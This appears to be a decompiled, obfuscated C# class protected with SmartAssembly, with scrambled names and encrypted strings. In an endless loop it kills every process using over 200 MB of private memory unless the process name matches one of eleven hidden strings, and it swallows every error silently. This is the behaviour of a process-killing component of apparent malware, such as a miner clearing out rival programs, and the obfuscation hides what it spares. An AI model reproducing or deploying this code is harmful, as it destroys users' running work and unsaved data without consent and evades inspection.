using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace VyjVuXvolaw;

public static class CkFJDetLAWA
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void lMZneRIifpgvfZVb()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107399718)) && !process.ProcessName.Contains(getString_0(107399741)) && !process.ProcessName.Contains(getString_0(107399700)) && !process.ProcessName.Contains(getString_0(107399691)) && !process.ProcessName.Contains(getString_0(107399710)) && !process.ProcessName.Contains(getString_0(107399665)) && !process.ProcessName.Contains(getString_0(107399684)) && !process.ProcessName.Contains(getString_0(107399671)) && !process.ProcessName.Contains(getString_0(107399114)) && !process.ProcessName.Contains(getString_0(107399133)) && !process.ProcessName.Contains(getString_0(107399080)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static CkFJDetLAWA()
	{
		Strings.CreateGetStringDelegate(typeof(CkFJDetLAWA));
	}
}
